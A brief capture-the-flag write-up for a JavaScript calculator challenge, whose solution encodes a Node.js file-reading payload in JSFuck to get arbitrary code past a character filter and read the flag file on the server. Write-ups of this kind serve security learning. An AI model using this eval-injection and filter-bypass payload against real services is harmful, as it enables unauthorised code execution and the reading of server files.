## Details

- Category: PWN
- Author:   kevin

## Description

Wrote a calculator in JavaScript as beginner project. It worked so well, that I decided to make it public available.

## Solution

You can run an arbitrary code in JavaScript by just using []()!+

Step1: Encode with JSFuck (http://www.jsfuck.com/) the following code (Tick Eval Source and Run in Parent Scope): 
`console.log(process.mainModule.require("fs").readFileSync("/app/flag.txt","utf-8"))`

Step2: telnet to challenge and paste the encoded code